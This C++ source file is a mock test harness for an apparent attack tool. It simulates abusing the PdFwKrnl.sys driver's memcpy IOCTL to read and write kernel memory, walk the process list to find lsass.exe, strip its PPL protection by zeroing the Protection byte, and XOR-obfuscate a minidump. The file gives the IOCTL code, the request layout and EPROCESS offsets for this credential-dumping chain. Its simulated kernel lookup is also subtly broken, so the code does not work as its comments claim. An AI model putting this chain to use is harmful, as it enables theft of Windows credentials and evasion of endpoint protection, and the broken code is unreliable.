/*
 * mock_driver_test.cpp
 *
 * Simulates the PdFwKrnl.sys kernel R/W + our warp.cpp flow without the real
 * driver, so the PPL-strip and XOR logic can be validated on any box.
 *
 * Simulates:
 *   - IOCTL 0x80002014 memcpy dispatch (kernel<->user)
 *   - A fake kernel address space holding EPROCESS structs on a real
 *     doubly-linked ActiveProcessLinks list
 *   - PPL protection state on the target
 *
 * What it exercises (mirrors src/warp.cpp):
 *   1. Walk ActiveProcessLinks from the System EPROCESS to find the target PID
 *   2. Read the target's ImageFileName and Protection byte (offset confirmed)
 *   3. Write the Protection byte to 0x00 (the PPL strip)
 *   4. Re-read to verify the strip landed
 *   5. XOR round-trip on a synthetic "minidump" buffer (validates our 0x55 key)
 *
 * Usage: mock_driver_test [target_pid]        (default 640)
 * Output ends with: "SUCCESS: PPL protection was stripped!"
 */

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <psapi.h>
#include <cstring>
#include <map>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

#define IOCTL_AMDPDFW_MEMCPY 0x80002014
const BYTE kXorKey = 0x55;

typedef struct _PDFW_MEMCPY {
    BYTE  Reserved[16];
    PVOID Destination;
    PVOID Source;
    PVOID Reserved2;
    DWORD Size;
    DWORD Reserved3;
} PDFW_MEMCPY;

struct KernelOffsets {
    ULONG64 UniqueProcessId    = 0x1D0;
    ULONG64 ActiveProcessLinks = 0x1D8;
    ULONG64 ImageFileName      = 0x338;
    ULONG64 Protection         = 0x5FA;
};
static KernelOffsets g_off;

// Fake kernel space: address -> bytes. Each EPROCESS lives at its own address.
static std::map<DWORD64, std::vector<BYTE>> g_kmem;

struct MockEPROCESS {
    BYTE pad1[0x1D0];
    DWORD UniqueProcessId;
    BYTE pad2[0x1D8 - 0x1D4];
    DWORD64 FLink;
    DWORD64 BLink;
    BYTE pad3[0x338 - 0x1E8];
    char ImageFileName[16];
    BYTE pad4[0x5FA - 0x348];
    BYTE Protection;
};

static void InsertProc(DWORD64 addr, DWORD pid, const char* name, BYTE prot) {
    MockEPROCESS e{};
    e.UniqueProcessId = pid;
    strncpy_s(e.ImageFileName, sizeof(e.ImageFileName), name, _TRUNCATE);
    e.Protection = prot;
    std::vector<BYTE> mem(sizeof(e));
    memcpy(mem.data(), &e, sizeof(e));
    g_kmem[addr] = mem;
}

static void SetFlink(DWORD64 eproc, DWORD64 next) {
    if (g_kmem.find(eproc) == g_kmem.end()) return;
    auto& m = g_kmem[eproc];
    memcpy(m.data() + 0x1D8, &next, 8);
}

// Simulate the driver: kernel->user when src is kernel, user->kernel when dst is kernel.
static bool SimIoctl(const PDFW_MEMCPY& r) {
    DWORD size = r.Size;
    if (!size || size > 16 * 1024 * 1024) return false;
    bool isKernelSrc = false, isKernelDst = false;
    for (auto& kv : g_kmem) {
        if (kv.first <= (DWORD64)r.Source && (DWORD64)r.Source < kv.first + kv.second.size()) { isKernelSrc = true; break; }
    }
    for (auto& kv : g_kmem) {
        if (kv.first <= (DWORD64)r.Destination && (DWORD64)r.Destination < kv.first + kv.second.size()) { isKernelDst = true; break; }
    }
    if (isKernelSrc && !isKernelDst) { // kernel -> user
        auto& m = g_kmem[(DWORD64)r.Source];
        DWORD64 off = (DWORD64)r.Source - (DWORD64)m.data();
        if (off + size > m.size()) return false;
        memcpy(r.Destination, &m[off], size);
    } else if (isKernelDst && !isKernelSrc) { // user -> kernel (the PPL strip)
        auto& m = g_kmem[(DWORD64)r.Destination];
        DWORD64 off = (DWORD64)r.Destination - (DWORD64)m.data();
        if (off + size > m.size()) return false;
        memcpy(&m[off], r.Source, size);
    } else {
        return false;
    }
    return true;
}

static bool KRead(DWORD64 a, PVOID b, DWORD s)  { PDFW_MEMCPY r{}; r.Destination = b; r.Source = (PVOID)a; r.Size = s; return SimIoctl(r); }
static bool KWrite(DWORD64 a, PVOID b, DWORD s) { PDFW_MEMCPY r{}; r.Destination = (PVOID)a; r.Source = b; r.Size = s; return SimIoctl(r); }
static DWORD64 KReadQword(DWORD64 a) { DWORD64 v = 0; if (KRead(a, &v, 8)) return v; return 0; }

static void XorBuffer(BYTE* p, DWORD size, BYTE key) { for (DWORD i = 0; i < size; i++) p[i] ^= key; }

int main(int argc, char* argv[]) {
    DWORD targetPid = (argc >= 2) ? (DWORD)std::stoul(argv[1]) : 640;
    std::cout << "[*] Mock warp flow against PID " << targetPid << std::endl;

    // Build a real doubly-linked list: System <-> csrss <-> lsass <-> (back to System)
    DWORD64 sys = 0xFFFFAA8000001000ULL;
    DWORD64 csrss = 0xFFFFAA8000002000ULL;
    DWORD64 lsass = 0xFFFFAA8000003000ULL;

    InsertProc(sys, 4, "System", 0x00);
    InsertProc(csrss, 520, "csrss.exe", 0x00);
    InsertProc(lsass, targetPid, "lsass.exe", 0x02);
    SetFlink(sys, csrss);
    SetFlink(csrss, lsass);
    SetFlink(lsass, sys); // head of list is System's FLink -> csrss

    DWORD64 listHead = sys + g_off.ActiveProcessLinks;
    std::cout << "[+] Built mock kernel list; head FLink = 0x" << std::hex << KReadQword(listHead) << std::dec << std::endl;

    // --- Phase 1 (warp.cpp equivalent): walk the list, find target ---
    DWORD64 flink = KReadQword(listHead);
    DWORD64 found = 0;
    int guard = 0;
    while (flink && flink != listHead && guard++ < 1000) {
        DWORD64 eproc = flink - g_off.ActiveProcessLinks;
        DWORD64 pid = KReadQword(eproc + g_off.UniqueProcessId);
        if (pid == targetPid) { found = eproc; break; }
        flink = KReadQword(eproc + g_off.ActiveProcessLinks);
    }
    if (!found) { std::cerr << "[-] Target PID not found in mock list." << std::endl; return 1; }

    char name[16]{};
    KRead(found + g_off.ImageFileName, name, 15);
    BYTE protBefore = 0;
    KRead(found + g_off.Protection, &protBefore, 1);
    std::cout << "[+] Found: " << name << "  EPROCESS 0x" << std::hex << found
              << "  prot 0x" << (int)protBefore << std::dec << std::endl;

    // --- Strip ---
    BYTE zero = 0;
    if (!KWrite(found + g_off.Protection, &zero, 1)) { std::cerr << "[-] Kernel write failed." << std::endl; return 1; }
    BYTE protAfter = 0;
    KRead(found + g_off.Protection, &protAfter, 1);
    std::cout << "[*] Protection after write: 0x" << (int)protAfter << std::endl;

    if (protAfter != 0) { std::cerr << "[-] Strip did not take effect." << std::endl; return 1; }
    std::cout << "[!!!] PPL stripped in mock kernel." << std::endl;

    // --- Phase 3 (warp.cpp equivalent): XOR round-trip on a synthetic minidump ---
    DWORD size = 4096;
    std::vector<BYTE> dump(size);
    memcpy(dump.data(), "MDMP", 4);
    for (DWORD i = 4; i < size; i++) dump[i] = (BYTE)(i * 31 + 7);

    XorBuffer(dump.data(), size, kXorKey);
    bool scrambled = !(dump[0] == 'M' && dump[1] == 'D' && dump[2] == 'M' && dump[3] == 'P');
    XorBuffer(dump.data(), size, kXorKey);
    bool restored = (memcmp(dump.data(), "MDMP", 4) == 0) && (dump[100] == (BYTE)(100 * 31 + 7));
    std::cout << (scrambled ? "[+] XOR scrambled MDMP header." : "[-] XOR did NOT scramble header.") << std::endl;
    std::cout << (restored ? "[+] XOR restores original bytes." : "[-] XOR did not restore bytes.") << std::endl;

    if (!scrambled || !restored) { std::cerr << "[-] XOR round-trip failed." << std::endl; return 1; }

    std::cout << "SUCCESS: PPL protection was stripped! and XOR round-trip passed." << std::endl;
    return 0;
}
